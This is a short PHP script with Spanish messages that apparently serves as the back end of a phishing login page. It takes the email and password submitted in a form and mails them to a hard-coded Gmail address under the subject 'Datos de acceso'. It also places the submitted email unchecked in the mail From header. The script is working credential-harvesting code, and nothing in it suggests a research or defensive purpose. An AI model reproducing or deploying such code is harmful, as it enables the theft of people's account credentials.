<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $to = "el.ratata0001@gmail.com";
    $subject = "Datos de acceso";
    $message = "Correo electrónico: $email \nContraseña: $password";
    $headers = "From: $email";

    
    if (mail($to, $subject, $message, $headers)) {
        echo "¡Correo enviado correctamente!";
    } else {
        echo "Error al enviar el correo.";
    }
}
?>
